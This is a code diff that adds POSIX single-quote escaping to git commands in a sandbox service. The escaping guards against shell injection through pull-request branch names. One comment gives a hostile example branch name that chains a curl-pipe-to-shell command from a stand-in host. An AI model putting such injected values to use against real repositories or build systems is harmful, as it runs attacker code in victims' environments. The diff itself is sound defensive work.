@@ -24,6 +24,16 @@ const TIMEOUTS = {
     COMMAND_SHORT_MS: 10_000,
 };
 
+/**
+ * Wrap a value in single quotes for safe inclusion in a POSIX shell command.
+ * Git ref names (and fork-controlled URLs) can contain characters the shell
+ * treats as control tokens — `;`, `&&`, `|`, `$()` — so a branch named
+ * `main;curl evil.sh|sh` would otherwise execute arbitrary commands inside
+ * the sandbox. Escape any embedded apostrophes using the `'\''` idiom.
+ */
+const shSingleQuote = (value: string): string =>
+    `'${value.replace(/'/g, "'\\''")}'`;
+
 @Injectable()
 export class E2BSandboxService implements ISandboxProvider {
     private readonly logger = createLogger(E2BSandboxService.name);
@@ -199,15 +209,23 @@ export class E2BSandboxService implements ISandboxProvider {
             },
         });
 
+        // `refspec` and `localRef` are built from PR/branch data that can be
+        // controlled by a forked PR author; `cloneUrl` is ours but still best
+        // practice. Quote all three to keep the shell from interpreting any
+        // metacharacters a crafted ref name could carry.
+        const safeCloneUrl = shSingleQuote(cloneUrl);
+        const safeRefspec = shSingleQuote(refspec);
+        const safeLocalRef = shSingleQuote(localRef);
+
         const cloneResult = await sandbox.commands.run(
             [
                 `git init ${REPO_DIR}`,
                 `cd ${REPO_DIR}`,
                 // Fetch using token from env var via git credential header (never touches disk/process args)
-                `git -c http.extraHeader="$GIT_AUTH_HEADER" fetch --depth=1 ${cloneUrl} ${refspec}:${localRef}`,
-                `git checkout ${localRef}`,
+                `git -c http.extraHeader="$GIT_AUTH_HEADER" fetch --depth=1 ${safeCloneUrl} ${safeRefspec}:${safeLocalRef}`,
+                `git checkout ${safeLocalRef}`,
                 // Set a dummy remote for any tools that expect "origin" to exist
-                `git remote add origin ${cloneUrl}`,
+                `git remote add origin ${safeCloneUrl}`,
                 // Block any push from the sandbox
                 `git remote set-url --push origin no-push-allowed`,
             ].join(' && '),
@@ -276,9 +294,12 @@ export class E2BSandboxService implements ISandboxProvider {
             metadata: { baseBranch },
         });
 
+        const safeBaseBranch = shSingleQuote(baseBranch);
+        const safeCloneUrl = shSingleQuote(cloneUrl);
+
         try {
             const result = await sandbox.commands.run(
-                `cd ${REPO_DIR} && git -c http.extraHeader="$GIT_AUTH_HEADER" fetch --depth=1 ${cloneUrl} refs/heads/${baseBranch}:refs/remotes/origin/${baseBranch}`,
+                `cd ${REPO_DIR} && git -c http.extraHeader="$GIT_AUTH_HEADER" fetch --depth=1 ${safeCloneUrl} refs/heads/${safeBaseBranch}:refs/remotes/origin/${safeBaseBranch}`,
                 {
                     timeoutMs: TIMEOUTS.CLONE_MS,
                     envs: { GIT_AUTH_HEADER: authHeader },
